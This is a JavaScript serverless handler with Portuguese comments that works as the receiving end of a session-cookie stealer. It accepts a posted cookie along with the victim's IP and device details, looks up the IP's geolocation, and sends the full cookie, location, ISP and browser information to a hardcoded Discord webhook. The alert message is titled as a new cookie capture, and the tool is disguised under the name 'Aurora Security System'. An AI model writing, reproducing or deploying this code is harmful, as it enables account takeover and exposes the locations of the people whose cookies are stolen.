export default async function handler(req, res) {
  // Permitir CORS
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  // Responder preflight requests
  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }

  // Apenas POST
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  try {
    const { cookie, ip, device, timestamp } = req.body;

    // Validar dados
    if (!cookie || cookie.length < 50) {
      return res.status(400).json({ error: 'Cookie inválido' });
    }

    // Buscar informações detalhadas do IP
    let ipInfo = {};
    try {
      const ipResponse = await fetch(`http://ip-api.com/json/${ip}?fields=66846719`);
      ipInfo = await ipResponse.json();
    } catch (e) {
      console.error('Erro ao buscar info do IP:', e);
    }

    // WEBHOOK DO DISCORD
    const webhookURL = 'https://canary.discord.com/api/webhooks/1477057706568323195/4545g7HNyqcjMCkJe2t95-djEoA-kuXgu-VY1u_zb6slpT3lpdmbwyxDl8urWU51Effi';

    // 🔥 CORRIGIDO - Cookie COMPLETO
    const embed = {
      content: '@everyone',
      embeds: [{
        title: '🔐 **NOVA CAPTURA DE COOKIE**',
        description: 'Um novo cookie foi capturado pelo sistema Aurora',
        color: 0x6366f1,
        fields: [
          {
            name: '🍪 **COOKIE COMPLETO**',
            value: '```' + cookie + '```' // ✅ AGORA VAI INTEIRO!
          },
          {
            name: '📊 **INFORMAÇÕES DO DISPOSITIVO**',
            value: `\`\`\`yml
Dispositivo: ${device}
Navegador: ${getBrowserInfo(req)}
Sistema: ${getOSInfo(req)}
Idioma: ${req.headers['accept-language'] || 'Desconhecido'}
\`\`\``
          },
          {
            name: '🌍 **INFORMAÇÕES DO IP**',
            value: `\`\`\`yml
IP: ${ip}
País: ${ipInfo.country || 'Desconhecido'} ${ipInfo.countryCode || ''}
Região: ${ipInfo.regionName || 'Desconhecido'}
Cidade: ${ipInfo.city || 'Desconhecido'}
CEP: ${ipInfo.zip || 'Desconhecido'}
Latitude: ${ipInfo.lat || 'Desconhecido'}
Longitude: ${ipInfo.lon || 'Desconhecido'}
Fuso Horário: ${ipInfo.timezone || 'Desconhecido'}
Provedor: ${ipInfo.isp || 'Desconhecido'}
Organização: ${ipInfo.org || 'Desconhecido'}
Mobile: ${ipInfo.mobile ? 'Sim' : 'Não'}
Proxy/VPN: ${ipInfo.proxy ? 'Sim' : 'Não'}
Hosting: ${ipInfo.hosting ? 'Sim' : 'Não'}
\`\`\``
          },
          {
            name: '⏰ **TIMESTAMP**',
            value: `<t:${Math.floor(Date.now() / 1000)}:F> (<t:${Math.floor(Date.now() / 1000)}:R>)`,
            inline: true
          },
          {
            name: '🔢 **ID DA SESSÃO**',
            value: `\`${generateSessionId()}\``,
            inline: true
          },
          {
            name: '📏 **TAMANHO DO COOKIE**',
            value: `\`${cookie.length} caracteres\``,
            inline: true
          }
        ],
        footer: {
          text: 'Aurora Security System • Proteção Avançada',
          icon_url: 'https://media.discordapp.net/attachments/1478076459074719877/1478567053999869993/Gemini_Generated_Image_17qz9117qz9117qz.png?ex=69a8de60&is=69a78ce0&hm=30c2567486c3f374e4fdc3e9ed7712ff5613520c72a7264d002dd1ad2b696328&=&format=webp&quality=lossless&width=240&height=233'
        },
        timestamp: new Date().toISOString(),
        thumbnail: {
          url: 'https://media.discordapp.net/attachments/1456825082507956428/1477117859665805312/clideo_editor_64f89f8646e04ff7b36cd451bf005602_online-video-cutter.com.gif?ex=69a835f5&is=69a6e475&hm=47008cff92b32b165301e19e2f528da6f4b03f42900a8401c989976a082459cd&=&width=569&height=320'
        }
      }]
    };

    // Enviar para o Discord
    const response = await fetch(webhookURL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(embed)
    });

    if (!response.ok) {
      throw new Error('Falha ao enviar para Discord');
    }

    return res.status(200).json({ success: true });
    
  } catch (error) {
    console.error('Erro:', error);
    return res.status(500).json({ error: 'Erro interno' });
  }
}

// Funções auxiliares
function getBrowserInfo(req) {
  const ua = req.headers['user-agent'] || '';
  if (ua.includes('Chrome')) return 'Google Chrome';
  if (ua.includes('Firefox')) return 'Mozilla Firefox';
  if (ua.includes('Safari')) return 'Apple Safari';
  if (ua.includes('Edge')) return 'Microsoft Edge';
  if (ua.includes('Opera')) return 'Opera';
  return 'Desconhecido';
}

function getOSInfo(req) {
  const ua = req.headers['user-agent'] || '';
  if (ua.includes('Windows')) return 'Windows';
  if (ua.includes('Mac OS')) return 'macOS';
  if (ua.includes('Linux')) return 'Linux';
  if (ua.includes('Android')) return 'Android';
  if (ua.includes('iOS')) return 'iOS';
  return 'Desconhecido';
}

function generateSessionId() {
  return Math.random().toString(36).substring(2, 15) + 
         Math.random().toString(36).substring(2, 15);
}
